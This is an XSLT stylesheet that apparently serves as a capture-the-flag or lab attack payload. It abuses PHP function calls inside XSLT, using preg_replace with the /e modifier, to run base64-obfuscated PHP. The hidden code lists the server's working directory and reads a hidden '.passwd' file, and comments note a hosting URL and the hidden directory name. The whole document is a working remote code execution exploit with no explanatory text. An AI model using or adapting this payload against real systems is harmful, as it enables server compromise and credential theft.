<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('preg_replace', '/known/e', php:function('base64_decode', 'dmFyX2R1bXAoc2NhbmRpcigiLiIpKTs='), 'known')"/>
<xsl:value-of select="php:function('preg_replace', '/known/e', php:function('base64_decode', 'ZmlsZV9nZXRfY29udGVudHMoIi42ZmYzMjAwYmVlNzg1ODAxZjQyMGZiYTgyNmZmY2RlZS8ucGFzc3dkIik7'), 'known')"/>
</xsl:template>
</xsl:stylesheet>
<!--http://bonetti.io:8000/test.xsl-->
<!--.6ff3200bee785801f420fba826ffcdee-->
